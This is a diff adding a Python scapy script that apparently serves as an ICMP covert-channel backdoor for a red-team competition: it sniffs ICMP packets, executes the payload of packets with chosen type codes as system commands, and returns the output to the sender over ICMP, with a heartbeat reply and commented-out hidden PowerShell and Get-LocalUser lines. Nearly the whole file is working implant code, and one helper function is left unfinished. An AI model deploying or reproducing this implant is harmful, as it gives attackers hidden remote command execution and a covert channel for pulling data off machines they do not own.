@@ -1,0 +1,60 @@
+from scapy.all import *
+import subprocess as sp
+import threading
+import sys
+import socket
+import random
+
+ip=socket.gethostbyname(socket.gethostname())  
+"""This is the only way I can thing to pass a file name from one if to aother
+There might be a better way to accomplish this but this is the only way I can come up with at the current moment
+"""
+
+def cmd_mon(pkt):
+    typ = str(pkt.getlayer(ICMP).type)
+    code = str(pkt.getlayer(ICMP).code)
+    source = pkt.getlayer(IP).src
+    cmd_proc(pkt, typ, code, source)
+
+    
+def cmd_proc(pkt, typ, code, source):
+    print(typ, code, source)
+    if typ >= "44" and typ <= "94":
+        if code == "0":
+            instruct = pkt.getlayer(ICMP).load.decode()
+            result = sp.run(instruct, capture_output=True)
+            if result.check_returncode() is None:
+                cmdout = result.stdout.decode()
+                print(cmdout)
+                send_output(cmdout, source, typ, code)
+    elif typ == "146":
+        heart(source, 146)
+
+def breakup(data):
+    broken = []
+   
+
+def send_output(output, sender,protype,protcode):
+    send(IP(dst=sender)/ICMP(type=int(protype), code=int(protcode))/output)
+
+
+""" May have to be from the server due to the fact that ping will be blocked in a competition on the inbound traffic 
+Or just checking to see if a response is recieved. IDK honestly. Gotta spend time drawing this out 
+"""
+def heart(dest, protype):
+    send(IP(dst=dest)/ICMP(type=protype, code=1)/"abcdefghijklmnopqrstuvwxyzhi")
+
+def sniffer():
+    sniff(filter="icmp", prn=cmd_mon)
+
+#def main():
+    #print("Loaded Rick")
+    #t1 = threading.Thread(target=heart)
+    #t2 = threading.Thread(target=sniffer)
+    #t2.start()
+    #t2.join()
+
+#cmd_proc("ep Get-LocalUser -Name Guest")
+#sp.run("powershell -windowstyle hidden -", capture_output=True)
+
+sniffer()
